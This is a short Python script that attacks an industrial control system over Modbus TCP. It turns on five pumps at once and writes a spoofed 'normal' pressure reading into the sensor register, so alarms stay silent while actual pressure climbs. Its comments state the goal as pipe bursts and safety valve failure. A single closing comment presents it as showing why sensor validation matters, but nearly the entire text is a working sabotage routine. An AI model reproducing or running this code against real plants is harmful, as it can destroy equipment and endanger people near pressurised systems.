def overpressure_attack(plc_ip, pump_register, pressure_sensor_register):
    """
    Cause dangerous overpressure by:
    1. Activating all pumps simultaneously
    2. Spoofing pressure sensor to show normal values
    """
    from pymodbus.client import ModbusTcpClient

    client = ModbusTcpClient(plc_ip, port=502)
    client.connect()

    # Phase 1: Activate all pumps
    pump_count = 5  # Assuming 5 pumps
    for pump_id in range(pump_count):
        client.write_coil(pump_register + pump_id, True, unit=1)
        print(f"[+] Pump {pump_id + 1} activated")

    # Phase 2: Spoof pressure sensor (requires MitM or direct sensor access)
    # Write false pressure value to register
    normal_pressure = 50  # PSI
    client.write_register(pressure_sensor_register, normal_pressure, unit=1)
    print(f"[+] Pressure sensor spoofed to {normal_pressure} PSI")

    # Actual pressure will continue rising
    # Without alarms, pressure relief valves may fail
    # Result: Pipe burst, equipment damage

    print("[!] Overpressure condition created")
    print("[!] Physical consequences: pipe burst, safety valve failure")

    client.close()

# This demonstrates why sensor validation and redundancy are critical
